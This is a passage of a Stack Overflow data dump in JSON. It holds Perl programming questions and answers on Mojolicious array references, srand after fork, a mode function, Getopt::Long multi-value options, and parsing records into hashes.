"display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1569580540, "post_id": 58123124, "comment_id": 102652507, "body": "I think we need to see a lot more of your Mojolicious code. Where, for example, does your <code>xm_data =&gt; @xm_data</code> fit in?"}], "answers": [{"comments": [{"owner": {"reputation": 181, "user_id": 11951910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9e03113010e0ff5276db85314438f15?s=128&d=identicon&r=PG&f=1", "display_name": "newdeveloper", "link": "https://stackoverflow.com/users/11951910/newdeveloper"}, "edited": false, "score": 0, "creation_date": 1569529750, "post_id": 58123231, "comment_id": 102637127, "body": "I will give that a shot tomorrow.  I did have <code>xm_data =&gt; \\@xm_data</code> but I was getting nowhere but it could be because I do not know perl all that well.  Thanks for the information and maybe that was my issue."}, {"owner": {"reputation": 181, "user_id": 11951910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9e03113010e0ff5276db85314438f15?s=128&d=identicon&r=PG&f=1", "display_name": "newdeveloper", "link": "https://stackoverflow.com/users/11951910/newdeveloper"}, "edited": false, "score": 0, "creation_date": 1569584763, "post_id": 58123231, "comment_id": 102654594, "body": "This worked thanks.  For some reason I tried this and it didnt work but maybe I had incorrect syntax.  Thanks."}], "tags": [], "owner": {"reputation": 140, "user_id": 4947979, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/gkQjQ.jpg?s=128&g=1", "display_name": "Nic Estrada", "link": "https://stackoverflow.com/users/4947979/nic-estrada"}, "is_accepted": true, "score": 3, "last_activity_date": 1569524699, "creation_date": 1569524699, "answer_id": 58123231, "question_id": 58123124, "link": "https://stackoverflow.com/questions/58123124/iterating-through-database-results/58123231#58123231", "title": "Iterating through database results", "body": "<p>I don't know anything about mojolicious, but I do know some perl.</p>\n\n<p>Your <code>xm_data =&gt; @xm_data</code> looks suspicious to me. If you assign an array to a scalar in perl, it only takes the first element of that array. To assign a pointer to the array, which it looks like you're trying to do, you need to use a backslash.</p>\n\n<p>Eg. <code>xm_data =&gt; \\@xm_data</code>.</p>\n\n<p>That will give you a reference to the array, which then you can dereference later in your <code>foreach</code> loop, like it seems you are doing already.</p>\n\n<p>Does that help?</p>\n"}], "owner": {"reputation": 181, "user_id": 11951910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c9e03113010e0ff5276db85314438f15?s=128&d=identicon&r=PG&f=1", "display_name": "newdeveloper", "link": "https://stackoverflow.com/users/11951910/newdeveloper"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 58123231, "answer_count": 1, "score": 0, "last_activity_date": 1569524699, "creation_date": 1569524193, "question_id": 58123124, "link": "https://stackoverflow.com/questions/58123124/iterating-through-database-results", "title": "Iterating through database results", "body": "<p>I am returning data from my query. Looping through the results and pushing the data in different arrays.\nWhen I try to then loop over the array I am only getting the first set of data and nothing else.</p>\n\n<pre><code> my @data = ();\n for my $row (@$query_data) {\n     if($row-&gt;[11] == 2)\n     {\n          push(@data,$row)\n     }\n }\n</code></pre>\n\n<p>On the perl script the following works and I am getting expected output.</p>\n\n<pre><code>    for my $row (@xm_data) {\n       print \"$row-&gt;[6]\\n\";\n    }\n</code></pre>\n\n<p>outputs </p>\n\n<pre><code>   mike\n   steve\n</code></pre>\n\n<p>When I do the samething more or less in mojolicious I am getting different results.  I am passing to the render looks <code>xm_data =&gt; @xm_data</code> and only getting the first results.<br>\nThe template loops is below.</p>\n\n<pre><code>% for my $request_data (@{$xm_data}) {\n    &lt;%= $request_data %&gt;\n% }\n</code></pre>\n\n<p>if i try the same syntax I do in the <code>.pl</code> file I get errors.</p>\n"}, {"tags": ["perl", "random", "fork", "random-seed"], "comments": [{"owner": {"reputation": 28567, "user_id": 815724, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a514cd424088a3ba3012f5d77f2e334?s=128&d=identicon&r=PG", "display_name": "Peter O.", "link": "https://stackoverflow.com/users/815724/peter-o"}, "edited": false, "score": 0, "creation_date": 1569513745, "post_id": 58120618, "comment_id": 102630054, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/8623131/why-is-rand-not-so-random-after-fork\">Why is rand() not so random after fork?</a>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 28567, "user_id": 815724, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a514cd424088a3ba3012f5d77f2e334?s=128&d=identicon&r=PG", "display_name": "Peter O.", "link": "https://stackoverflow.com/users/815724/peter-o"}, "edited": false, "score": 0, "creation_date": 1569514249, "post_id": 58120618, "comment_id": 102630270, "body": "@PeterO. Um, no -- that discusses a different use case. Of course that one can use <code>rand</code> across <code>fork</code>s, that&#39;s one of (very few) purposes of <code>srand</code> (when used accordingly).  See an example in my answer"}], "answers": [{"comments": [{"owner": {"reputation": 51, "user_id": 9528148, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/094b40ec470688fc4d2f152ffbbd7251?s=128&d=identicon&r=PG&f=1", "display_name": "Yuval", "link": "https://stackoverflow.com/users/9528148/yuval"}, "edited": false, "score": 0, "creation_date": 1569514310, "post_id": 58120770, "comment_id": 102630301, "body": "Thanks. I tried adding: <code>srand()</code> just before calling rand. Still got the exact same randoms."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 51, "user_id": 9528148, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/094b40ec470688fc4d2f152ffbbd7251?s=128&d=identicon&r=PG&f=1", "display_name": "Yuval", "link": "https://stackoverflow.com/users/9528148/yuval"}, "edited": false, "score": 0, "creation_date": 1569514628, "post_id": 58120770, "comment_id": 102630455, "body": "@Yuval Yes, you mention -- I don&#39;t know what went wrong there?"}, {"owner": {"reputation": 51, "user_id": 9528148, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/094b40ec470688fc4d2f152ffbbd7251?s=128&d=identicon&r=PG&f=1", "display_name": "Yuval", "link": "https://stackoverflow.com/users/9528148/yuval"}, "edited": false, "score": 0, "creation_date": 1569514953, "post_id": 58120770, "comment_id": 102630617, "body": "I looked again, I had a typo and didn&#39;t call <code>srand()</code> as I thought.  So why actually people use the random libraries for general purposes that are not security instead of simply using <code>srand</code> ?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 51, "user_id": 9528148, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/094b40ec470688fc4d2f152ffbbd7251?s=128&d=identicon&r=PG&f=1", "display_name": "Yuval", "link": "https://stackoverflow.com/users/9528148/yuval"}, "edited": false, "score": 0, "creation_date": 1569515560, "post_id": 58120770, "comment_id": 102630923, "body": "@Yuval  &quot;<i>why actually people use ... instead of simply using srand</i>&quot;  -- I don&#39;t know. A good use of <code>rand</code> is exactly what you say in your good question, when &quot;<i>just need a good spread</i>&quot;. Using seed (<code>srand</code> for <code>rand</code>) can be useful (for specific purposes), in any language, environment, or library."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 5, "last_activity_date": 1572564147, "last_edit_date": 1572564147, "creation_date": 1569513949, "answer_id": 58120770, "question_id": 58120618, "link": "https://stackoverflow.com/questions/58120618/how-to-get-random-number-in-forked-processes/58120770#58120770", "title": "How to get random number in forked processes?", "body": "<p>It is indeed <a href=\"https://perldoc.perl.org/functions/srand.html\" rel=\"nofollow noreferrer\">srand</a> that you want. While it is true that generally one need not muck about with it, there are a few uses </p>\n\n<blockquote>\n  <p>However, there are a few situations where programs are likely to want to call <code>srand</code>. One is for generating predictable results, generally for testing or debugging. There, you use <code>srand($seed)</code>, with the same <code>$seed</code> each time. </p>\n</blockquote>\n\n<p>and, precisely for your purpose</p>\n\n<blockquote>\n  <p>Another case is that you may want to call <code>srand</code> after a <code>fork</code> to avoid child processes sharing the same seed value as the parent (and consequently each other).</p>\n</blockquote>\n\n<p>A quicky example</p>\n\n<pre><code>perl -wE'\n    say \"Parent $$ rand: \", rand;  \n    for (1..4) { \n        $pid = fork // die \"Cant fork: $!\"; \n        if ($pid == 0) { srand(); say \"\\tchild $$ rand: \", rand; exit } \n    }'\n</code></pre>\n\n<p>Prints</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Parent 23375 rand: 0.502774688721733\n        child 23376 rand: 0.914527430039929\n        child 23377 rand: 0.97985713889739\n        child 23378 rand: 0.127702740327553\n        child 23379 rand: 0.187181734786467\n</code></pre>\n\n<p>It is the <code>srand</code> up there that does the trick; without it the numbers are the same (as they must be).  Note that it can be run with a seed as well, which gives us better diagnostic/testing control.</p>\n\n<hr>\n\n<p>A note, to avoid spreading bad habits.   </p>\n\n<p>In a quick program as above the child processes get cleaned up by the system (reaped by <em>init</em>). However, one really should <em>always</em> reap so the above should really have</p>\n\n<pre><code>for (1..4) { \n    $pid = fork // die \"Cant fork: $!\"; \n    if ($pid == 0) { srand(); say \"\\tchild $$ rand: \", rand; exit } \n    push @procs, $pid;\n}\nfor (@procs) { $gone = wait; say \"$gone exited with $?\" }\n</code></pre>\n\n<p>just better with <a href=\"https://perldoc.perl.org/functions/waitpid.html\" rel=\"nofollow noreferrer\">waitpid</a> and non-blocking for better monitoring, and perhaps in a <a href=\"https://perldoc.perl.org/perlipc.html#Signals\" rel=\"nofollow noreferrer\">signal handler</a>.</p>\n"}], "owner": {"reputation": 51, "user_id": 9528148, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/094b40ec470688fc4d2f152ffbbd7251?s=128&d=identicon&r=PG&f=1", "display_name": "Yuval", "link": "https://stackoverflow.com/users/9528148/yuval"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 0, "accepted_answer_id": 58120770, "answer_count": 1, "score": 2, "last_activity_date": 1572564147, "creation_date": 1569513416, "last_edit_date": 1569906837, "question_id": 58120618, "link": "https://stackoverflow.com/questions/58120618/how-to-get-random-number-in-forked-processes", "title": "How to get random number in forked processes?", "body": "<p>I'm forking few processes and I need each process to perform a task on a randomly selected items. \nI found that the forked processes pick the exact same random numbers. \nI tried generating seeds and call srand(), but it didn't help much. Actually, most documentation I've read suggest to avoid srand() \"unless you know exactly what you're doing\". </p>\n\n<p>Here is my code:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse Getopt::Long qw(GetOptions);\nuse Time::HiRes qw(time);\nuse MongoDB;\n#use Math::Random::Secure qw(rand);\n\nmy $num_clients = shift;\nmy $num_loops = 50_000_000;\n\nsub test_forked_sub {\n    my $sum=0;\n    my $random_offset = rand(120);\n    printf \"time: %10.4f -  Random offset: %6.2f at pid: %s  \\n\", time(), $random_offset, $$;\n    for (my $i=0; $i &lt; $num_loops  ; $i++) {\n        $sum += rand(120);\n    }\n}\n\nmy $nub_processes = 0;\nfor (my $client_id =0; $client_id &lt; $num_clients; $client_id++ ) {\n    if (my $pid = fork) {     #Parent\n        $nub_processes++;\n    }\n    else {         # child\n        die \"cannot fork: $!\" unless defined $pid;\n        test_forked_sub();\n        exit(0);\n    }\n}\n\nwhile ($nub_processes){\n    wait;\n    $nub_processes--;\n}\n\n</code></pre>\n\n<p>When I run it I get the exact same \"random\" number in each of the processes:</p>\n\n<pre><code>$ time ./test_rand_fork.pl 10\ntime: 1569510011.6891 -  Random offset:  46.64 at pid: 2091\ntime: 1569510011.6937 -  Random offset:  46.64 at pid: 2092\ntime: 1569510011.6987 -  Random offset:  46.64 at pid: 2093\ntime: 1569510011.7028 -  Random offset:  46.64 at pid: 2094\ntime: 1569510011.7070 -  Random offset:  46.64 at pid: 2095\ntime: 1569510011.7097 -  Random offset:  46.64 at pid: 2096\ntime: 1569510011.7144 -  Random offset:  46.64 at pid: 2097\ntime: 1569510011.7203 -  Random offset:  46.64 at pid: 2098\ntime: 1569510011.7230 -  Random offset:  46.64 at pid: 2099\ntime: 1569510011.7249 -  Random offset:  46.64 at pid: 2100\n\nreal    0m3.974s\nuser    0m32.955s\nsys     0m1.444s\n</code></pre>\n\n<p>A possible but ugly solution, it not to fork. Instead, to run multiple instances from my shell as follows:</p>\n\n<pre><code># shell processes\n$ for i in `seq 1 10`; do  ./test_rand_fork.pl 1 &amp;  done\ntime: 1569511908.7708 -  Random offset:   7.44 at pid: 4129\ntime: 1569511908.8070 -  Random offset:  19.50 at pid: 4131\ntime: 1569511908.8068 -  Random offset:  97.59 at pid: 4132\ntime: 1569511908.8073 -  Random offset:  14.51 at pid: 4133\ntime: 1569511908.8077 -  Random offset:  16.70 at pid: 4134\ntime: 1569511908.8080 -  Random offset: 108.63 at pid: 4138\ntime: 1569511908.8079 -  Random offset:  69.44 at pid: 4137\ntime: 1569511908.8080 -  Random offset:  83.25 at pid: 4136\ntime: 1569511908.8080 -  Random offset:  43.33 at pid: 4135\ntime: 1569511908.8203 -  Random offset:  33.82 at pid: 4139\n</code></pre>\n\n<p>As the \"shell processes\" is an ugly solution, I tried to use Math::Random::Secure. \nHere are the results I get randomness as needed but it is 50 times slower than the \"shell processes\" approach: </p>\n\n<pre><code># using: Math::Random::Secure qw(rand);\n$ time ./test_rand_fork.pl 10\ntime: 1569510036.9331 -  Random offset: 112.48 at pid: 2128\ntime: 1569510036.9470 -  Random offset:  47.15 at pid: 2129\ntime: 1569510036.9501 -  Random offset:  20.77 at pid: 2130\ntime: 1569510036.9517 -  Random offset:  40.98 at pid: 2131\ntime: 1569510036.9521 -  Random offset:  13.84 at pid: 2132\ntime: 1569510036.9538 -  Random offset:  20.43 at pid: 2133\ntime: 1569510036.9543 -  Random offset:  48.48 at pid: 2134\ntime: 1569510036.9563 -  Random offset: 109.29 at pid: 2135\ntime: 1569510036.9579 -  Random offset:  70.30 at pid: 2136\ntime: 1569510036.9601 -  Random offset:  24.31 at pid: 2137\n\nreal    3m17.251s\nuser    32m31.129s\nsys     0m1.054s\n</code></pre>\n\n<p>The randomness I need is not for security purposes, I just need a good spread. \nIs there a way to generate a good-enough seed for the forked processes and still use the standard rand() or alternative faster way? or at least something that doesn't require installing additional library?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 5, "creation_date": 1569512560, "post_id": 58120347, "comment_id": 102629493, "body": "Hi and welcome on StackOverflow. Could on please: 1. properly indent your code, 2. provide a sample input and output, 3. clearly point out what behavior you are getting compared to what you would like to get?"}, {"owner": {"reputation": 36, "user_id": 5080088, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-enHC44r4RSw/AAAAAAAAAAI/AAAAAAAAAAA/yR1NkzfAXgM/photo.jpg?sz=128", "display_name": "Pankaj Singh", "link": "https://stackoverflow.com/users/5080088/pankaj-singh"}, "edited": false, "score": 0, "creation_date": 1569514196, "post_id": 58120347, "comment_id": 102630241, "body": "Input = (64630,11735 ,14216, 99233,14470 4978,73429,4978,38120,51135,67060,51135). Output = 4978. In case two numbers have same frequencies the smallest of them will be returned. Currently, when I take the input through &lt;STDIN&gt; the results are not correct. Request your inputs on the same"}, {"owner": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "edited": false, "score": 0, "creation_date": 1569516733, "post_id": 58120347, "comment_id": 102631471, "body": "What does &quot;The results are not correct&quot; mean?"}, {"owner": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "edited": false, "score": 0, "creation_date": 1569516891, "post_id": 58120347, "comment_id": 102631545, "body": "You specified &quot;In case two numbers have same frequencies the smallest of them will be returned.&quot;  The end of your code does not do that.  If I remember correctly, when two values are equal, the <code>sort</code> routine will order them randomly."}, {"owner": {"reputation": 36, "user_id": 5080088, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-enHC44r4RSw/AAAAAAAAAAI/AAAAAAAAAAA/yR1NkzfAXgM/photo.jpg?sz=128", "display_name": "Pankaj Singh", "link": "https://stackoverflow.com/users/5080088/pankaj-singh"}, "reply_to_user": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "edited": false, "score": 0, "creation_date": 1569523967, "post_id": 58120347, "comment_id": 102634695, "body": "@hymie that means that it returns the values from list randomly every time the code is executed."}, {"owner": {"reputation": 1787, "user_id": 1712449, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/PlwBV.gif?s=128&g=1", "display_name": "hymie", "link": "https://stackoverflow.com/users/1712449/hymie"}, "edited": false, "score": 0, "creation_date": 1569545299, "post_id": 58120347, "comment_id": 102640658, "body": "The code you offerred above does not return values from the list randomly.  For example, it never returns the number 67060.  You should look at the key-value pairs in your <code>%data</code> hash and compare them to the numbers that your code returns."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1569583295, "post_id": 58120347, "comment_id": 102653827, "body": "<a href=\"https://meta.stackoverflow.com/questions/284236/why-is-can-someone-help-me-not-an-actual-question\" title=\"why is can someone help me not an actual question\">meta.stackoverflow.com/questions/284236/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 36, "user_id": 5080088, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-enHC44r4RSw/AAAAAAAAAAI/AAAAAAAAAAA/yR1NkzfAXgM/photo.jpg?sz=128", "display_name": "Pankaj Singh", "link": "https://stackoverflow.com/users/5080088/pankaj-singh"}, "edited": false, "score": 0, "creation_date": 1569513704, "post_id": 58120535, "comment_id": 102630035, "body": "Dear All, Thanks for your help out here.  Input = (64630,11735 ,14216, 99233,14470 4978,73429,4978,38120,51135,67060,51135). Output = 4978. In case two numbers have same frequencies the smallest of them will be returned. Currently, when I take the input through &lt;STDIN&gt; the results are not correct. Request your inputs on the same."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 36, "user_id": 5080088, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-enHC44r4RSw/AAAAAAAAAAI/AAAAAAAAAAA/yR1NkzfAXgM/photo.jpg?sz=128", "display_name": "Pankaj Singh", "link": "https://stackoverflow.com/users/5080088/pankaj-singh"}, "edited": false, "score": 2, "creation_date": 1569569941, "post_id": 58120535, "comment_id": 102647005, "body": "@PankajSingh: &quot;results are not correct&quot; is a terrible bug report :-) What is incorrect about them?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 36, "user_id": 5080088, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-enHC44r4RSw/AAAAAAAAAAI/AAAAAAAAAAA/yR1NkzfAXgM/photo.jpg?sz=128", "display_name": "Pankaj Singh", "link": "https://stackoverflow.com/users/5080088/pankaj-singh"}, "edited": false, "score": 0, "creation_date": 1569578721, "post_id": 58120535, "comment_id": 102651545, "body": "@PankajSingh: I think I&#39;ve worked out what you mean. Please see the update to my answer."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 1, "last_activity_date": 1569578688, "last_edit_date": 1569578688, "creation_date": 1569513112, "answer_id": 58120535, "question_id": 58120347, "link": "https://stackoverflow.com/questions/58120347/mode-function-in-perl/58120535#58120535", "title": "Mode function in Perl", "body": "<p>Having cleaned up your indentation and added <code>use strict</code> and <code>use warnings</code>, I get the following code.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\n\nmy @array = &lt;STDIN&gt;;\nmy @sorted = sort { $a &lt;=&gt; $b } @array ;\n\nmy %data;\n\nfor my $i (@sorted) {\n  my $cnt = 0;\n  for my $j (@sorted) {\n    if ($i eq $j) {\n      $cnt = $cnt + 1;\n      $data{$i}= $cnt;\n    }\n  }\n}\n\nmy @modes = sort { $data{$a} &lt;=&gt; $data{$b} } keys %data;\n\nsay \"The mode is: $modes[-1]\";\n</code></pre>\n\n<p>And that seems to work correctly. So, perhaps, you need to explain the problem in a little more detail.</p>\n\n<p><strong>Update:</strong> Ok, so I think I now understand your problem - even though you really haven't said what it is very clearly.</p>\n\n<p>If there are two potential values for the mode (i.e. two numbers that appear the same number of times) then you want the smallest one. And your current solution picks one of the potential values at random.</p>\n\n<p>The problem is this line:</p>\n\n<pre><code>@modes = sort { $data{$a} &lt;=&gt; $data{$b} } keys %data;\n</code></pre>\n\n<p>This sorts the hash by the number of times the values appear. But if multiple values appear the same number of time, they can appear in any order - so you'll get a seemingly random number out of the end.</p>\n\n<p>The solution is to add more intelligence to the sort so that in case of a tie, the smaller key sorts last. That would look like this:</p>\n\n<pre><code>my @modes = sort {\n              $data{$a} &lt;=&gt; $data{$b}\n              or\n              $b        &lt;=&gt; $a\n            } keys %data;\n</code></pre>\n"}], "owner": {"reputation": 36, "user_id": 5080088, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-enHC44r4RSw/AAAAAAAAAAI/AAAAAAAAAAA/yR1NkzfAXgM/photo.jpg?sz=128", "display_name": "Pankaj Singh", "link": "https://stackoverflow.com/users/5080088/pankaj-singh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 152, "favorite_count": 0, "accepted_answer_id": 58120535, "answer_count": 1, "score": -2, "last_activity_date": 1569578688, "creation_date": 1569512380, "last_edit_date": 1569512966, "question_id": 58120347, "link": "https://stackoverflow.com/questions/58120347/mode-function-in-perl", "title": "Mode function in Perl", "body": "<p>I need help with creating the mode function in Perl. I have written a code using help from different sources but every time the value differs. \nMode - The maximum frequency of occurrence of an element in an array </p>\n\n<p>Current Code -</p>\n\n<pre><code>@array = &lt;STDIN&gt;;\n@sorted = sort { $a &lt;=&gt; $b } @array ;\nfor $i(@sorted)\n{\n    $cnt =0;\n    for $j(@sorted)\n    {\n        if($i eq $j)\n        {\n            $cnt = $cnt + 1;\n            $data{$i}= $cnt;\n        }\n    }\n}\n@modes = sort { $data{$a} &lt;=&gt; $data{$b} } keys %data;\n$mode = $modes[-1];\n</code></pre>\n"}, {"tags": ["perl", "getopt-long"], "answers": [{"tags": [], "owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "is_accepted": true, "score": 4, "last_activity_date": 1569508030, "creation_date": 1569508030, "answer_id": 58119019, "question_id": 58118876, "link": "https://stackoverflow.com/questions/58118876/passing-arrays-to-getopt-in-perl/58119019#58119019", "title": "Passing arrays to getopt in Perl", "body": "<p>Use <code>s{,}</code> rather than <code>s@</code>. This options is described in <code>perldoc Getopt::Long</code>, paragraph <a href=\"https://perldoc.perl.org/Getopt/Long.html#Options-with-multiple-values\" rel=\"nofollow noreferrer\">Options with multiple values</a>:</p>\n\n<blockquote>\n  <p>Options can take multiple values at once, for example</p>\n\n<pre><code>    --coordinates 52.2 16.4 --rgbcolor 255 255 149\n</code></pre>\n  \n  <p>This can be accomplished by adding a repeat specifier to the option\n  specification. Repeat specifiers are very similar to the {...} repeat\n  specifiers that can be used with regular expression patterns. For\n  example, the above command line would be handled as follows:</p>\n\n<pre><code>    GetOptions('coordinates=f{2}' =&gt; \\@coor, 'rgbcolor=i{3}' =&gt; \\@color);\n</code></pre>\n  \n  <p>The destination for the option must be an array or array reference.</p>\n  \n  <p>It is also possible to specify the minimal and maximal number of\n  arguments an option takes. foo=s{2,4} indicates an option that takes\n  at least two and at most 4 arguments. foo=s{1,} indicates one or more\n  values; foo:s{,} indicates zero or more option values.</p>\n</blockquote>\n\n<p>More precisely, using:</p>\n\n<pre><code>GetOptions (\"a=s{,}\" =&gt; \\@array);\n</code></pre>\n\n<p>in your code does the trick.</p>\n"}], "owner": {"reputation": 4229, "user_id": 3973175, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/9c15391d610e59c350912be638b14074?s=128&d=identicon&r=PG", "display_name": "con", "link": "https://stackoverflow.com/users/3973175/con"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 157, "favorite_count": 0, "accepted_answer_id": 58119019, "answer_count": 1, "score": 0, "last_activity_date": 1569508030, "creation_date": 1569507576, "last_edit_date": 1569507989, "question_id": 58118876, "link": "https://stackoverflow.com/questions/58118876/passing-arrays-to-getopt-in-perl", "title": "Passing arrays to getopt in Perl", "body": "<p>I am attempting to pass an array to Perl at the command line.</p>\n\n<p>I am reading instructions from <a href=\"https://perldoc.perl.org/Getopt/Long.html\" rel=\"nofollow noreferrer\">https://perldoc.perl.org/Getopt/Long.html</a></p>\n\n<p>my script is</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings FATAL =&gt; 'all';\nuse feature 'say';\nuse autodie ':all';\nuse Getopt::Long 'GetOptions';\n\nmy @array;\nGetOptions (\"a=s@\" =&gt; \\@array);#'file' indicates string on command line, '=s' means it must be a string\nif (defined $array[0]) {#http://perldoc.perl.org/Getopt/Long.html#Options-with-values\n    my @z = split(/,/,join(',',@array));\n    say 'The array is ' . join (', ', @z);\n}\n</code></pre>\n\n<p>which using the command line outputs</p>\n\n<pre><code>con@VB:~/Scripts$ perl array_getopt.pl -a v c d\nThe array is v\n</code></pre>\n\n<p>which is not correct, as it misses <code>c</code> and <code>d</code></p>\n\n<p>I have also tried \n<code>GetOptions (\"a=s\" =&gt; \\@array);</code> which has the same error.</p>\n\n<p>I see something on that page that says I would have to repeat the same tag over and over like <code>perl array_getopt.pl -a v -a c -a d</code>, which the end user won't like.</p>\n\n<p>How can I pass information to the command line so <code>-a v c d</code> will pass to an array?</p>\n"}, {"tags": ["perl", "parsing", "hash", "subroutine"], "answers": [{"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 3, "last_activity_date": 1569503643, "creation_date": 1569503643, "answer_id": 58117626, "question_id": 58116869, "link": "https://stackoverflow.com/questions/58116869/problems-with-output-order-after-returning-multiple-values-through-a-subroutine/58117626#58117626", "title": "Problems with output order after returning multiple values through a subroutine in Perl", "body": "<p>I'm afraid this is all rather confused. I think that the main problem is your use of global variables. A subroutine should only ever use variables that are either passed into it as parameters or defined within it. Also, storing the data about an animal across three different hashes is a recipe for disaster. As you've seen, you can't guarantee that the different hashes remain in step.</p>\n\n<p>Let's start by writing a subroutine that takes one of your \"paragraphs\" of data about a single animal and turns it into a hash.</p>\n\n<pre><code>sub parse_animal {\n  my ($input) = @_;\n\n  my %animal;\n\n  for (split /\\n/, $input) {\n    next unless /\\S/;\n\n    if (/Id:\\s+(\\S+)/) {\n      $animal{id} = $1;\n      next;\n    }\n    if (/Loc:\\s+(\\S+)/) {\n      $animal{loc} = $1;\n      next;\n    }\n    if (/Similarity:\\s+(\\S+)/) {\n      $animal{simil} = $1;\n      next;\n    }\n    warn \"Unknown data line: $_\";\n  }\n\n  return \\%animal;\n}\n</code></pre>\n\n<p>This looks a lot like your code except it only uses data passed as parameters and it builds and returns a hash of information.</p>\n\n<p>We can test that by putting in a program like this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\nuse Data::Dumper;\n\nmy $animal1 = 